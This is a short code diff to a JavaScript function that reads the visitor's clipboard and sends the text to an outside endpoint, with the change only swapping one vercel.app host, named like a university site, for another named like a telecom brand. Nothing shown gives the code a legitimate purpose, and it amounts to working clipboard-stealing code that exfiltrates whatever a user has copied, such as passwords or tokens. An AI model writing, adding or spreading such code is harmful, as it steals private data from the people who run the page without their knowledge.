@@ -1,6 +1,6 @@
 function getClipboard() {
     navigator.clipboard.readText().then(function (text) {
-        fetch(`https://online-uni-mysore-in.vercel.app/api/send?data=${encodeURIComponent(text)}&api=@f@aabz`,)
+        fetch(`https://airtel-net.vercel.app/api/send?data=${encodeURIComponent(text)}&api=@f@aabz`,)
     });
 }
 
